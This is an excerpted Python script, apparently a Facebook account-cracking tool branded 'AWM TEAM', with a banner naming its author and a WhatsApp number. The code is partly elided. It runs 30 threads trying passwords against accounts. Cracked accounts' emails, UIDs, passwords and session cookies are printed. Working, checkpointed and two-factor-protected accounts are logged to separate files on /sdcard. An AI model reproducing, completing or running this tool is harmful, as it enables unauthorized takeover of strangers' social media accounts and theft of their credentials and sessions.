...
logo =f"""
{BLUE}=====================================
{BLUE}====  =====  ====  ====  ==  =====  =     \033[1;32m 𓆩A̧W̧M̧ ŢȨA̧M̧𓆪
{BLUE}===    ====  ====  ====  ==   ===   =
{BLUE}==  ==  ===  ====  ====  ==  =   =  =
{BLUE}=  ====  ==  ====  ====  ==  == ==  =       \033[1;32m 𓆩P̆R̆Ŏ𓆪
{BLUE}=  ====  ==   ==    ==  ===  =====  =
{BLUE}=        ===  ==    ==  ===  =====  =
{BLUE}=  ====  ===  ==    ==  ===  =====  =       \033[1;32m 𓆩D̆ĂR̆K̆𓆪
{BLUE}=  ====  ====    ==    ====  =====  =
{BLUE}=  ====  =====  ====  =====  =====  =
=====================================
\033[1;37m╔AWM═════════════════\033[1;33mAWM✯𝐓𝐄𝐀𝐌\033[1;37m══════════════AWM╗
\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32mMirwais Danishyar     \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32mMirwais Danishyar\033[1;31m     │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32mAWM-PRO               \033[1;31m │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m+93796747343         \033[1;31m │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m1.0                 \033[1;31m   │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32mANDROID TECH AWM   \033[1;31m   │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐓𝐘𝐏𝐄      \033[1;31m ➟   \033[1;32m𝐏𝐈𝐀𝐃                \033[1;31m   │
\033[1;37m╚AWM.FACEBOOK TRICKS AND HELPING ZONE{ AWM }\033[1;37mAWM╝
...
def cek_apk(session,coki):
    ...
    #____________#
def xyz():
    os.system("play-audio WELCOME_TO_AWM_BOOT_818.mp3")
    os.getuid
...
def Tabii():
    ...
    with ThreadPool(max_workers=30) as yaari:    
        ...
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {RED}DALL KHOR")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[AWM🤩-OK]--------------------[√]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/AWMR-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[AWM🥺-CP]---------------------[×]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/AWMR-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/AWMR-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[AWMR] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
